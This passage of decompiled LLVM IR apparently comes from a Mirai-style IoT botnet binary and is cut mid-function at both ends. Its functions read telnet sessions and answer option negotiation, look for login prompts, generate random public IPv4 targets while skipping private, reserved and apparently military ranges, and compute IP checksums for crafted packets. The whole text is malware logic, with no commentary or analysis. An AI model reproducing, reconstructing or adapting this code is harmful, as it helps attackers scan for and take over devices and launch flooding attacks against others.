  %v2_a490 = load i8, i8* %v1_a46c, align 1
  %v7_a494 = icmp eq i8 %v2_a490, 32
  br i1 %v7_a494, label %dec_label_pc_a438, label %dec_label_pc_a49c

dec_label_pc_a49c:                                ; preds = %dec_label_pc_a478
  %v2_a4b4 = load i8, i8* %v1_a46c, align 1
  %v7_a4b8 = icmp eq i8 %v2_a4b4, 13
  br i1 %v7_a4b8, label %dec_label_pc_a438, label %dec_label_pc_a4c0

dec_label_pc_a4c0:                                ; preds = %dec_label_pc_a49c
  %v2_a4d8 = load i8, i8* %v1_a46c, align 1
  %v7_a4dc = icmp eq i8 %v2_a4d8, 10
  br i1 %v7_a4dc, label %dec_label_pc_a438, label %dec_label_pc_a4e4

dec_label_pc_a4e4:                                ; preds = %dec_label_pc_a4c0, %dec_label_pc_a438, %dec_label_pc_a444.preheader
  %stack_var_-28.0.lcssa = phi i32 [ %stack_var_-28.1, %dec_label_pc_a444.preheader ], [ %stack_var_-28.014, %dec_label_pc_a4c0 ], [ %v1_a43c, %dec_label_pc_a438 ]
  %v2_a4f8 = sub i32 %v2_a460, %stack_var_-28.0.lcssa
  %v1_a4fc = inttoptr i32 %v2_a4f8 to i8*
  %v2_a4fc = load i8, i8* %v1_a4fc, align 1
  %v2_a50c = add i32 %storemerge3, ptrtoint ([6 x i8]* @global_var_1c004.66 to i32)
  %v1_a510 = inttoptr i32 %v2_a50c to i8*
  %v2_a510 = load i8, i8* %v1_a510, align 1
  %v9_a514 = icmp eq i8 %v2_a4fc, %v2_a510
  %v1_a52c = add i32 %storemerge3, 1
  br i1 %v9_a514, label %dec_label_pc_a554, label %dec_label_pc_a534

dec_label_pc_a534:                                ; preds = %dec_label_pc_a4e4, %entry
  %stack_var_-28.1 = phi i32 [ 0, %entry ], [ %stack_var_-28.0.lcssa, %dec_label_pc_a4e4 ]
  %storemerge3 = phi i32 [ 0, %entry ], [ %v1_a52c, %dec_label_pc_a4e4 ]
  %v3_a53c = call i32 @strlen(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1c004.66, i32 0, i32 0))
  %v3_a544 = icmp ult i32 %storemerge3, %v3_a53c
  br i1 %v3_a544, label %dec_label_pc_a444.preheader, label %dec_label_pc_a554

dec_label_pc_a444.preheader:                      ; preds = %dec_label_pc_a534
  %v7_a45013 = icmp sgt i32 %v3_a418, %stack_var_-28.1
  br i1 %v7_a45013, label %dec_label_pc_a454, label %dec_label_pc_a4e4

dec_label_pc_a554:                                ; preds = %dec_label_pc_a534, %dec_label_pc_a4e4
  %storemerge4 = phi i32 [ 1, %dec_label_pc_a4e4 ], [ 0, %dec_label_pc_a534 ]
  ret i32 %storemerge4

; uselistorder directives
  uselistorder i32 %stack_var_-28.1, { 2, 0, 1 }
  uselistorder i32 %stack_var_-28.0.lcssa, { 1, 0 }
  uselistorder i32 %v3_a418, { 1, 2, 0 }
  uselistorder label %dec_label_pc_a4e4, { 2, 0, 1 }
}

define i32 @readUntil(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_a570 = load i32, i32* @fp, align 4
  store i32 %v3_a570, i32* %stack_var_-16, align 4
  %v13_a570 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %arg4, i32* %stack_var_-176, align 4
  %v2_a5c0 = ptrtoint i32* %stack_var_-168 to i32
  %v3_a600 = udiv i32 %arg1, 32
  %v3_a60c = mul nuw nsw i32 %v3_a600, 4
  %v1_a624 = urem i32 %arg1, 32
  %v6_a62c = shl i32 1, %v1_a624
  %v1_a650 = add i32 %arg1, 1
  %v2_a658 = ptrtoint i32* %stack_var_-176 to i32
  %v6_a778 = inttoptr i32 %arg2 to i8*
  %v2_a78c = icmp eq i32 %arg3, 0
  %v1_a798 = inttoptr i32 %arg6 to i8*
  %v5_a7dc = icmp sgt i32 %arg5, 0
  %v2_a614 = add nsw i32 %v3_a60c, -152
  %v2_a618 = add i32 %v2_a614, %v13_a570
  %v1_a61c = inttoptr i32 %v2_a618 to i32*
  br label %dec_label_pc_a7b4

dec_label_pc_a5d4.lr.ph:                          ; preds = %dec_label_pc_a7c8, %dec_label_pc_a7d4
  br label %dec_label_pc_a5d4

dec_label_pc_a5d4:                                ; preds = %dec_label_pc_a5d4.lr.ph, %dec_label_pc_a5d4
  %storemerge27 = phi i32 [ 0, %dec_label_pc_a5d4.lr.ph ], [ %v1_a5e8, %dec_label_pc_a5d4 ]
  %v5_a5e0 = mul nuw nsw i32 %storemerge27, 4
  %v6_a5e0 = add i32 %v5_a5e0, %v2_a5c0
  %v7_a5e0 = inttoptr i32 %v6_a5e0 to i32*
  store i32 0, i32* %v7_a5e0, align 4
  %v1_a5e8 = add nuw nsw i32 %storemerge27, 1
  %tmp30 = icmp ult i32 %v1_a5e8, 32
  br i1 %tmp30, label %dec_label_pc_a5d4, label %dec_label_pc_a5fc

dec_label_pc_a5fc:                                ; preds = %dec_label_pc_a5d4
  %v2_a61c = load i32, i32* %v1_a61c, align 4
  %v2_a630 = or i32 %v2_a61c, %v6_a62c
  store i32 %v2_a630, i32* %v1_a61c, align 4
  %v5_a66c = call i32 @__libc_select(i32 %v1_a650, i32 %v2_a5c0, i32 0, i32 0, i32 %v2_a658)
  %tmp31 = icmp slt i32 %v5_a66c, 1
  br i1 %tmp31, label %dec_label_pc_a7f8, label %dec_label_pc_a67c

dec_label_pc_a67c:                                ; preds = %dec_label_pc_a5fc
  %v2_a688 = add i32 %stack_var_-40.0, %arg6
  %v5_a68c = inttoptr i32 %v2_a688 to i8*
  %v6_a6a0 = call i32 @__libc_recv(i32 %arg1, i32 %v2_a688, i32 1, i32 0, i32 %v2_a688)
  %v7_a6b0 = icmp eq i32 %v6_a6a0, -1
  br i1 %v7_a6b0, label %dec_label_pc_a6c4, label %dec_label_pc_a6b8

dec_label_pc_a6b8:                                ; preds = %dec_label_pc_a67c
  %v2_a6bc = icmp eq i32 %v6_a6a0, 0
  br i1 %v2_a6bc, label %dec_label_pc_a6c4, label %dec_label_pc_a6d0

dec_label_pc_a6c4:                                ; preds = %dec_label_pc_a6b8, %dec_label_pc_a67c
  br label %dec_label_pc_a800

dec_label_pc_a6d0:                                ; preds = %dec_label_pc_a6b8
  %v2_a6d8 = add i32 %v6_a6a0, %stack_var_-40.0
  %v2_a6e4 = load i8, i8* %v5_a68c, align 1
  %v2_a6e8 = icmp eq i8 %v2_a6e4, -1
  br i1 %v2_a6e8, label %dec_label_pc_a6f0, label %dec_label_pc_a770

dec_label_pc_a6f0:                                ; preds = %dec_label_pc_a6d0
  %v1_a6f4 = add i32 %v2_a688, 1
  %v5_a708 = call i32 @__libc_recv(i32 %arg1, i32 %v1_a6f4, i32 2, i32 0, i32 %v2_a6d8)
  %v7_a718 = icmp eq i32 %v5_a708, -1
  br i1 %v7_a718, label %dec_label_pc_a72c, label %dec_label_pc_a720

dec_label_pc_a720:                                ; preds = %dec_label_pc_a6f0
  %v2_a724 = icmp eq i32 %v5_a708, 0
  br i1 %v2_a724, label %dec_label_pc_a72c, label %dec_label_pc_a738

dec_label_pc_a72c:                                ; preds = %dec_label_pc_a720, %dec_label_pc_a6f0
  br label %dec_label_pc_a800

dec_label_pc_a738:                                ; preds = %dec_label_pc_a720
  %v2_a740 = add i32 %v5_a708, %v2_a6d8
  %v5_a754 = call i32 @negotiate(i32 %arg1, i32 %v2_a688, i32 3, i32 %v2_a740, i32 %v2_a740)
  %v2_a75c = icmp eq i32 %v5_a754, 0
  br i1 %v2_a75c, label %dec_label_pc_a764, label %dec_label_pc_a7b4

dec_label_pc_a764:                                ; preds = %dec_label_pc_a738
  br label %dec_label_pc_a800

dec_label_pc_a770:                                ; preds = %dec_label_pc_a6d0
  %v3_a6e4 = zext i8 %v2_a6e4 to i32
  %v7_a778 = call i32 @strstr(i32 %arg6, i8* %v6_a778, i32 %stack_var_-40.0, i32 %v3_a6e4, i32 %v2_a6d8, i32 %v6_a6a0)
  %v2_a780 = icmp eq i32 %v7_a778, 0
  br i1 %v2_a780, label %dec_label_pc_a788, label %dec_label_pc_a7ec

dec_label_pc_a788:                                ; preds = %dec_label_pc_a770
  br i1 %v2_a78c, label %dec_label_pc_a7b4, label %dec_label_pc_a794

dec_label_pc_a794:                                ; preds = %dec_label_pc_a788
  %v2_a798 = call i32 @matchPrompt(i8* %v1_a798)
  %v2_a7a0 = icmp eq i32 %v2_a798, 0
  br i1 %v2_a7a0, label %dec_label_pc_a7b4, label %dec_label_pc_a7ec

dec_label_pc_a7b4:                                ; preds = %dec_label_pc_a738, %dec_label_pc_a794, %dec_label_pc_a788, %entry
  %stack_var_-40.0 = phi i32 [ %arg8, %entry ], [ %v2_a740, %dec_label_pc_a738 ], [ %v2_a6d8, %dec_label_pc_a788 ], [ %v2_a6d8, %dec_label_pc_a794 ]
  %v1_a7b8 = add i32 %stack_var_-40.0, 2
  %v6_a7c4 = icmp slt i32 %v1_a7b8, %arg7
  br i1 %v6_a7c4, label %dec_label_pc_a7c8, label %dec_label_pc_a7f8

dec_label_pc_a7c8:                                ; preds = %dec_label_pc_a7b4
  %v3_a7c8 = load i32, i32* %stack_var_-176, align 4
  %v5_a7d0 = icmp sgt i32 %v3_a7c8, 0
  br i1 %v5_a7d0, label %dec_label_pc_a5d4.lr.ph, label %dec_label_pc_a7d4

dec_label_pc_a7d4:                                ; preds = %dec_label_pc_a7c8
  br i1 %v5_a7dc, label %dec_label_pc_a5d4.lr.ph, label %dec_label_pc_a7f8

dec_label_pc_a7ec:                                ; preds = %dec_label_pc_a770, %dec_label_pc_a794
  br label %dec_label_pc_a800

dec_label_pc_a7f8:                                ; preds = %dec_label_pc_a5fc, %dec_label_pc_a7d4, %dec_label_pc_a7b4
  br label %dec_label_pc_a800

dec_label_pc_a800:                                ; preds = %dec_label_pc_a7ec, %dec_label_pc_a764, %dec_label_pc_a72c, %dec_label_pc_a6c4, %dec_label_pc_a7f8
  %stack_var_-196.0 = phi i32 [ 0, %dec_label_pc_a7f8 ], [ 1, %dec_label_pc_a7ec ], [ 0, %dec_label_pc_a6c4 ], [ 0, %dec_label_pc_a72c ], [ 0, %dec_label_pc_a764 ]
  ret i32 %stack_var_-196.0

; uselistorder directives
  uselistorder i32 %stack_var_-40.0, { 3, 1, 0, 2 }
  uselistorder i32 %v5_a708, { 1, 2, 0 }
  uselistorder i8 %v2_a6e4, { 1, 0 }
  uselistorder i32 %v2_a6d8, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v6_a6a0, { 2, 1, 3, 0 }
  uselistorder i32 %storemerge27, { 1, 0 }
  uselistorder i32 %v2_a5c0, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-176, { 0, 2, 1 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @negotiate, { 1, 0 }
  uselistorder i32 %arg6, { 1, 0, 2 }
  uselistorder i32 %arg1, { 2, 3, 4, 5, 1, 0 }
  uselistorder label %dec_label_pc_a800, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_a7f8, { 1, 2, 0 }
  uselistorder label %dec_label_pc_a7ec, { 1, 0 }
  uselistorder label %dec_label_pc_a7b4, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_a5d4, { 1, 0 }
  uselistorder label %dec_label_pc_a5d4.lr.ph, { 1, 0 }
}

define i32 @GetRandomPublicIP(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_a818 = load i32, i32* @r4, align 4
  %v6_a818 = load i32, i32* @fp, align 4
  %v13_a818 = load i32, i32* @lr, align 4
  store i32 43040, i32* %stack_var_-4, align 4
  %v2_a81c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_a81c, i32* @fp, align 4
  %v0_a824 = call i32 @rand()
  %v2_a840 = sdiv i32 %v0_a824, 49
  %tmp27 = mul i32 %v2_a840, -223
  %v2_a860 = add i32 %tmp27, %v0_a824
  %v1_a874 = trunc i32 %v2_a860 to i8
  store i8 %v1_a874, i8* bitcast (i8** @global_var_264b3.69 to i8*), align 4
  %v0_a878 = call i32 @rand()
  %v2_a894 = sdiv i32 %v0_a878, 51
  %tmp28 = mul i32 %v2_a894, -255
  %v2_a8ac = add i32 %tmp28, %v0_a878
  %v1_a8c0 = trunc i32 %v2_a8ac to i8
  store i8 %v1_a8c0, i8* @global_var_264b4.71, align 1
  %v0_a8c4 = call i32 @rand()
  %v2_a8e0 = sdiv i32 %v0_a8c4, 51
  %tmp29 = mul i32 %v2_a8e0, -255
  %v2_a8f8 = add i32 %tmp29, %v0_a8c4
  %v1_a90c = trunc i32 %v2_a8f8 to i8
  store i8 %v1_a90c, i8* @global_var_264b5.72, align 1
  %v0_a910 = call i32 @rand()
  %v2_a92c = sdiv i32 %v0_a910, 51
  %tmp = mul i32 %v2_a92c, -255
  %v2_a944 = add i32 %v0_a910, %tmp
  %extract.t = trunc i32 %v2_a944 to i8
  br label %dec_label_pc_aa98

dec_label_pc_a960:                                ; preds = %dec_label_pc_aca8, %dec_label_pc_ac98, %dec_label_pc_ac88, %dec_label_pc_ac78, %dec_label_pc_ac68, %dec_label_pc_ac58, %dec_label_pc_ac48, %dec_label_pc_ac38, %dec_label_pc_ac28, %dec_label_pc_ac18, %dec_label_pc_ac08, %dec_label_pc_abf8, %dec_label_pc_abe8, %dec_label_pc_abd8, %dec_label_pc_abc8, %dec_label_pc_ab98, %dec_label_pc_ab78, %dec_label_pc_ab48, %dec_label_pc_ab18, %dec_label_pc_aaf8, %dec_label_pc_aae8, %dec_label_pc_aad8, %dec_label_pc_aac8, %dec_label_pc_aab8, %dec_label_pc_aaa8, %dec_label_pc_aa98
  %v0_a960 = call i32 @rand()
  %v2_a97c = sdiv i32 %v0_a960, 49
  %tmp30 = mul i32 %v2_a97c, -223
  %v2_a99c = add i32 %tmp30, %v0_a960
  %v1_a9b0 = trunc i32 %v2_a99c to i8
  store i8 %v1_a9b0, i8* bitcast (i8** @global_var_264b3.69 to i8*), align 4
  %v0_a9b4 = call i32 @rand()
  %v2_a9d0 = sdiv i32 %v0_a9b4, 51
  %tmp31 = mul i32 %v2_a9d0, -255
  %v2_a9e8 = add i32 %tmp31, %v0_a9b4
  %v1_a9fc = trunc i32 %v2_a9e8 to i8
  store i8 %v1_a9fc, i8* @global_var_264b4.71, align 1
  %v0_aa00 = call i32 @rand()
  %v2_aa1c = sdiv i32 %v0_aa00, 51
  %tmp32 = mul i32 %v2_aa1c, -255
  %v2_aa34 = add i32 %tmp32, %v0_aa00
  %v1_aa48 = trunc i32 %v2_aa34 to i8
  store i8 %v1_aa48, i8* @global_var_264b5.72, align 1
  %v0_aa4c = call i32 @rand()
  %v2_aa68 = sdiv i32 %v0_aa4c, 51
  %tmp39 = mul i32 %v2_aa68, -255
  %v2_aa80 = add i32 %v0_aa4c, %tmp39
  %extract.t38 = trunc i32 %v2_aa80 to i8
  br label %dec_label_pc_aa98

dec_label_pc_aa98:                                ; preds = %entry, %dec_label_pc_a960
  %v2_a944.sink.off0 = phi i8 [ %extract.t, %entry ], [ %extract.t38, %dec_label_pc_a960 ]
  store i8 %v2_a944.sink.off0, i8* @global_var_264b6.73, align 1
  %v2_aa9c = load i8, i8* bitcast (i8** @global_var_264b3.69 to i8*), align 4
  %v3_aa9c = zext i8 %v2_aa9c to i32
  %v7_aaa0 = icmp eq i8 %v2_aa9c, 127
  br i1 %v7_aaa0, label %dec_label_pc_a960, label %dec_label_pc_aaa8

dec_label_pc_aaa8:                                ; preds = %dec_label_pc_aa98
  %v2_aab0 = icmp eq i8 %v2_aa9c, 0
  br i1 %v2_aab0, label %dec_label_pc_a960, label %dec_label_pc_aab8

dec_label_pc_aab8:                                ; preds = %dec_label_pc_aaa8
  %v7_aac0 = icmp eq i8 %v2_aa9c, 3
  br i1 %v7_aac0, label %dec_label_pc_a960, label %dec_label_pc_aac8

dec_label_pc_aac8:                                ; preds = %dec_label_pc_aab8
  %v7_aad0 = icmp eq i8 %v2_aa9c, 15
  br i1 %v7_aad0, label %dec_label_pc_a960, label %dec_label_pc_aad8

dec_label_pc_aad8:                                ; preds = %dec_label_pc_aac8
  %v7_aae0 = icmp eq i8 %v2_aa9c, 16
  br i1 %v7_aae0, label %dec_label_pc_a960, label %dec_label_pc_aae8

dec_label_pc_aae8:                                ; preds = %dec_label_pc_aad8
  %v7_aaf0 = icmp eq i8 %v2_aa9c, 56
  br i1 %v7_aaf0, label %dec_label_pc_a960, label %dec_label_pc_aaf8

dec_label_pc_aaf8:                                ; preds = %dec_label_pc_aae8
  %v7_ab00 = icmp eq i8 %v2_aa9c, 10
  br i1 %v7_ab00, label %dec_label_pc_a960, label %dec_label_pc_ab08

dec_label_pc_ab08:                                ; preds = %dec_label_pc_aaf8
  %v7_ab10 = icmp eq i8 %v2_aa9c, -64
  br i1 %v7_ab10, label %dec_label_pc_ab18, label %dec_label_pc_ab28

dec_label_pc_ab18:                                ; preds = %dec_label_pc_ab08
  %v3_ab1c = load i8, i8* @global_var_264b4.71, align 1
  %v7_ab20 = icmp eq i8 %v3_ab1c, -88
  br i1 %v7_ab20, label %dec_label_pc_a960, label %dec_label_pc_ab28

dec_label_pc_ab28:                                ; preds = %dec_label_pc_ab08, %dec_label_pc_ab18
  %v7_ab30 = icmp eq i8 %v2_aa9c, -84
  br i1 %v7_ab30, label %dec_label_pc_ab38, label %dec_label_pc_ab58

dec_label_pc_ab38:                                ; preds = %dec_label_pc_ab28
  %v3_ab3c = load i8, i8* @global_var_264b4.71, align 1
  %tmp40 = icmp ult i8 %v3_ab3c, 16
  br i1 %tmp40, label %dec_label_pc_ab58, label %dec_label_pc_ab48

dec_label_pc_ab48:                                ; preds = %dec_label_pc_ab38
  %tmp41 = icmp ult i8 %v3_ab3c, 32
  br i1 %tmp41, label %dec_label_pc_a960, label %dec_label_pc_ab58

dec_label_pc_ab58:                                ; preds = %dec_label_pc_ab28, %dec_label_pc_ab48, %dec_label_pc_ab38
  %v7_ab60 = icmp eq i8 %v2_aa9c, 100
  br i1 %v7_ab60, label %dec_label_pc_ab68, label %dec_label_pc_ab88

dec_label_pc_ab68:                                ; preds = %dec_label_pc_ab58
  %v3_ab6c = load i8, i8* @global_var_264b4.71, align 1
  %tmp42 = icmp ult i8 %v3_ab6c, 64
  br i1 %tmp42, label %dec_label_pc_ab88, label %dec_label_pc_ab78

dec_label_pc_ab78:                                ; preds = %dec_label_pc_ab68
  %tmp43 = icmp ult i8 %v3_ab6c, 127
  br i1 %tmp43, label %dec_label_pc_a960, label %dec_label_pc_ab88

dec_label_pc_ab88:                                ; preds = %dec_label_pc_ab58, %dec_label_pc_ab78, %dec_label_pc_ab68
  %v7_ab90 = icmp eq i8 %v2_aa9c, -87
  br i1 %v7_ab90, label %dec_label_pc_ab98, label %dec_label_pc_aba8

dec_label_pc_ab98:                                ; preds = %dec_label_pc_ab88
  %v3_ab9c = load i8, i8* @global_var_264b4.71, align 1
  %v2_aba0 = icmp eq i8 %v3_ab9c, -1
  br i1 %v2_aba0, label %dec_label_pc_a960, label %dec_label_pc_aba8

dec_label_pc_aba8:                                ; preds = %dec_label_pc_ab88, %dec_label_pc_ab98
  %v7_abb0 = icmp eq i8 %v2_aa9c, -58
  br i1 %v7_abb0, label %dec_label_pc_abb8, label %dec_label_pc_abd8

dec_label_pc_abb8:                                ; preds = %dec_label_pc_aba8
  %v3_abbc = load i8, i8* @global_var_264b4.71, align 1
  %tmp44 = icmp ult i8 %v3_abbc, 18
  br i1 %tmp44, label %dec_label_pc_abd8, label %dec_label_pc_abc8

dec_label_pc_abc8:                                ; preds = %dec_label_pc_abb8
  %tmp45 = or i8 %v3_abbc, 1
  %tmp46 = icmp eq i8 %tmp45, 19
  br i1 %tmp46, label %dec_label_pc_a960, label %dec_label_pc_abd8

dec_label_pc_abd8:                                ; preds = %dec_label_pc_aba8, %dec_label_pc_abc8, %dec_label_pc_abb8
  %v7_abe0 = icmp eq i8 %v2_aa9c, -32
  br i1 %v7_abe0, label %dec_label_pc_a960, label %dec_label_pc_abe8

dec_label_pc_abe8:                                ; preds = %dec_label_pc_abd8
  %v7_abf0 = icmp eq i8 %v2_aa9c, 6
  br i1 %v7_abf0, label %dec_label_pc_a960, label %dec_label_pc_abf8

dec_label_pc_abf8:                                ; preds = %dec_label_pc_abe8
  %v7_ac00 = icmp eq i8 %v2_aa9c, 7
  br i1 %v7_ac00, label %dec_label_pc_a960, label %dec_label_pc_ac08

dec_label_pc_ac08:                                ; preds = %dec_label_pc_abf8
  %v7_ac10 = icmp eq i8 %v2_aa9c, 11
  br i1 %v7_ac10, label %dec_label_pc_a960, label %dec_label_pc_ac18

dec_label_pc_ac18:                                ; preds = %dec_label_pc_ac08
  %v7_ac20 = icmp eq i8 %v2_aa9c, 21
  br i1 %v7_ac20, label %dec_label_pc_a960, label %dec_label_pc_ac28

dec_label_pc_ac28:                                ; preds = %dec_label_pc_ac18
  %v7_ac30 = icmp eq i8 %v2_aa9c, 22
  br i1 %v7_ac30, label %dec_label_pc_a960, label %dec_label_pc_ac38

dec_label_pc_ac38:                                ; preds = %dec_label_pc_ac28
  %v7_ac40 = icmp eq i8 %v2_aa9c, 26
  br i1 %v7_ac40, label %dec_label_pc_a960, label %dec_label_pc_ac48

dec_label_pc_ac48:                                ; preds = %dec_label_pc_ac38
  %v7_ac50 = icmp eq i8 %v2_aa9c, 28
  br i1 %v7_ac50, label %dec_label_pc_a960, label %dec_label_pc_ac58

dec_label_pc_ac58:                                ; preds = %dec_label_pc_ac48
  %v7_ac60 = icmp eq i8 %v2_aa9c, 29
  br i1 %v7_ac60, label %dec_label_pc_a960, label %dec_label_pc_ac68

dec_label_pc_ac68:                                ; preds = %dec_label_pc_ac58
  %v7_ac70 = icmp eq i8 %v2_aa9c, 30
  br i1 %v7_ac70, label %dec_label_pc_a960, label %dec_label_pc_ac78

dec_label_pc_ac78:                                ; preds = %dec_label_pc_ac68
  %v7_ac80 = icmp eq i8 %v2_aa9c, 33
  br i1 %v7_ac80, label %dec_label_pc_a960, label %dec_label_pc_ac88

dec_label_pc_ac88:                                ; preds = %dec_label_pc_ac78
  %v7_ac90 = icmp eq i8 %v2_aa9c, 55
  br i1 %v7_ac90, label %dec_label_pc_a960, label %dec_label_pc_ac98

dec_label_pc_ac98:                                ; preds = %dec_label_pc_ac88
  %v7_aca0 = icmp eq i8 %v2_aa9c, -42
  br i1 %v7_aca0, label %dec_label_pc_a960, label %dec_label_pc_aca8

dec_label_pc_aca8:                                ; preds = %dec_label_pc_ac98
  %v7_acb0 = icmp eq i8 %v2_aa9c, -41
  br i1 %v7_acb0, label %dec_label_pc_a960, label %dec_label_pc_acb8

dec_label_pc_acb8:                                ; preds = %dec_label_pc_aca8
  %v2_acb8 = ptrtoint i32* %stack_var_-40 to i32
  store i32 0, i32* %stack_var_-40, align 4
  %v3_ad00 = load i8, i8* @global_var_264b4.71, align 1
  %v4_ad00 = zext i8 %v3_ad00 to i32
  store i32 %v4_ad00, i32* @r4, align 4
  %v3_ad0c = load i8, i8* @global_var_264b5.72, align 1
  %v6_ad34 = sext i8 %v3_ad00 to i32
  %v8_ad34 = sext i8 %v3_ad0c to i32
  %v10_ad34 = sext i8 %v2_a944.sink.off0 to i32
  %v11_ad34 = call i32 @szprintf(i32 %v2_acb8, i32 ptrtoint ([12 x i8]* @global_var_1c00c.75 to i32), i32 %v3_aa9c, i32 %v6_ad34, i32 %v8_ad34, i32 %v10_ad34)
  store i32 %v2_acb8, i32* @r0, align 4
  %v1_ad40 = call i32 @inet_addr(i32 %v2_acb8)
  store i32 %v3_a818, i32* @r4, align 4
  store i32 %v6_a818, i32* @fp, align 4
  store i32 %v13_a818, i32* @lr, align 4
  ret i32 %v1_ad40

; uselistorder directives
  uselistorder i32 %v2_acb8, { 2, 1, 0 }
  uselistorder i32 %v0_aa00, { 1, 0 }
  uselistorder i32 %v0_a9b4, { 1, 0 }
  uselistorder i32 %v0_a960, { 1, 0 }
  uselistorder i32 %v0_a8c4, { 1, 0 }
  uselistorder i32 %v0_a878, { 1, 0 }
  uselistorder i32 %v0_a824, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i8* @global_var_264b5.72, { 2, 1, 0 }
  uselistorder i8* @global_var_264b4.71, { 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i8* bitcast (i8** @global_var_264b3.69 to i8*), { 2, 0, 1 }
  uselistorder label %dec_label_pc_abd8, { 1, 2, 0 }
  uselistorder label %dec_label_pc_aba8, { 1, 0 }
  uselistorder label %dec_label_pc_ab88, { 1, 2, 0 }
  uselistorder label %dec_label_pc_ab58, { 1, 2, 0 }
  uselistorder label %dec_label_pc_ab28, { 1, 0 }
  uselistorder label %dec_label_pc_aa98, { 1, 0 }
}

define i32 @GetRandomIP(i32 %arg1) local_unnamed_addr {
entry:
  %v3_ad6c = load i32, i32* @fp, align 4
  %v2_ad80 = load i32, i32* @global_var_2c6fc.77, align 4
  %v1_ad88 = call i32 @__GI_ntohl(i32 %v2_ad80)
  %v2_ad94 = and i32 %v1_ad88, %arg1
  %v0_ad9c = call i32 @rand_cmwc()
  %v1_ada8 = sub i32 -1, %arg1
  %v2_adac = and i32 %v0_ad9c, %v1_ada8
  %v2_adb4 = xor i32 %v2_adac, %v2_ad94
  store i32 %v3_ad6c, i32* @fp, align 4
  ret i32 %v2_adb4
}

define i32 @csum(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v8_ae409 = icmp sgt i32 %arg2, 1
  br i1 %v8_ae409, label %dec_label_pc_adf8, label %dec_label_pc_ae44

dec_label_pc_adf8:                                ; preds = %entry, %dec_label_pc_adf8
  %v2_ae0c = phi i32 [ %v2_ae10, %dec_label_pc_adf8 ], [ 0, %entry ]
  %stack_var_-44.012 = phi i32 [ %v5_ae14, %dec_label_pc_adf8 ], [ 0, %entry ]
  %stack_var_-40.011 = phi i32 [ %v1_ae30, %dec_label_pc_adf8 ], [ %arg2, %entry ]
  %stack_var_-36.010 = phi i16* [ %v5_ae28, %dec_label_pc_adf8 ], [ %arg1, %entry ]
  %v4_adf8 = ptrtoint i16* %stack_var_-36.010 to i32
  %v2_adfc = load i16, i16* %stack_var_-36.010, align 2
  %v3_adfc = zext i16 %v2_adfc to i32
  %v2_ae10 = add i32 %v3_adfc, %v2_ae0c
  %v3_ae10 = icmp ult i32 %v2_ae10, %v2_ae0c
  %v4_ae14 = zext i1 %v3_ae10 to i32
  %v5_ae14 = add i32 %v4_ae14, %stack_var_-44.012
  %v1_ae24 = add i32 %v4_adf8, 2
  %v5_ae28 = inttoptr i32 %v1_ae24 to i16*
  %v1_ae30 = add nsw i32 %stack_var_-40.011, -2
  %v8_ae40 = icmp sgt i32 %v1_ae30, 1
  br i1 %v8_ae40, label %dec_label_pc_adf8, label %dec_label_pc_ae38.dec_label_pc_ae44_crit_edge

dec_label_pc_ae38.dec_label_pc_ae44_crit_edge:    ; preds = %dec_label_pc_adf8
  br label %dec_label_pc_ae44

dec_label_pc_ae44:                                ; preds = %dec_label_pc_ae38.dec_label_pc_ae44_crit_edge, %entry
  %v2_ae64 = phi i32 [ %v2_ae10, %dec_label_pc_ae38.dec_label_pc_ae44_crit_edge ], [ 0, %entry ]
  %stack_var_-36.0.lcssa = phi i16* [ %v5_ae28, %dec_label_pc_ae38.dec_label_pc_ae44_crit_edge ], [ %arg1, %entry ]
  %stack_var_-44.0.lcssa = phi i32 [ %v5_ae14, %dec_label_pc_ae38.dec_label_pc_ae44_crit_edge ], [ 0, %entry ]
  %v7_ae3c.lcssa.in = phi i32 [ %v1_ae30, %dec_label_pc_ae38.dec_label_pc_ae44_crit_edge ], [ %arg2, %entry ]
  %v7_ae3c.lcssa = icmp eq i32 %v7_ae3c.lcssa.in, 1
  br i1 %v7_ae3c.lcssa, label %dec_label_pc_ae50, label %dec_label_pc_aecc.preheader

dec_label_pc_ae50:                                ; preds = %dec_label_pc_ae44
  %v1_ae54 = bitcast i16* %stack_var_-36.0.lcssa to i8*
  %v2_ae54 = load i8, i8* %v1_ae54, align 1
  %v3_ae54 = zext i8 %v2_ae54 to i32
  %v2_ae68 = add i32 %v3_ae54, %v2_ae64
  %v3_ae68 = icmp ult i32 %v2_ae68, %v2_ae64
  %v4_ae6c = zext i1 %v3_ae68 to i32
  %v5_ae6c = add i32 %v4_ae6c, %stack_var_-44.0.lcssa
  br label %dec_label_pc_aecc.preheader

dec_label_pc_aecc.preheader:                      ; preds = %dec_label_pc_ae50, %dec_label_pc_ae44
  %v3_aef8.ph = phi i32 [ %v2_ae64, %dec_label_pc_ae44 ], [ %v2_ae68, %dec_label_pc_ae50 ]
  %stack_var_-44.1.ph = phi i32 [ %stack_var_-44.0.lcssa, %dec_label_pc_ae44 ], [ %v5_ae6c, %dec_label_pc_ae50 ]
  %v3_aed037 = mul i32 %stack_var_-44.1.ph, 65536
  %v3_aed838 = udiv i32 %v3_aef8.ph, 65536
  %v2_aedc39 = or i32 %v3_aed037, %v3_aed838
  %v3_aee440 = udiv i32 %stack_var_-44.1.ph, 65536
  %v2_aeec41 = or i32 %v2_aedc39, %v3_aee440
  %v2_aef042 = icmp eq i32 %v2_aeec41, 0
  br i1 %v2_aef042, label %dec_label_pc_aef8, label %dec_label_pc_ae7c

dec_label_pc_ae7c:                                ; preds = %dec_label_pc_aecc.preheader, %dec_label_pc_ae7c
